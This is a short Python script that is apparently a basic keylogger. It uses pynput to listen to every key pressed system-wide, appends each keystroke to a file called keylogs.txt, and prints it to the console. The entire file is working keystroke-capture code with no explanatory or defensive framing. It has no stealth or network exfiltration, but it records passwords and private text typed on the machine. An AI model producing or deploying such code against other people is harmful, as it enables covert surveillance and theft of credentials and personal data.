from pynput import keyboard

def on_press(key):
    try:
        with open("keylogs.txt", "a") as f:
            f.write(key.char)
        print(f"Key {key.char} pressed")
    except AttributeError:
        with open("keylogs.txt", "a") as f:
            f.write(str(key))
        print(f"Special key {str(key)} pressed")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()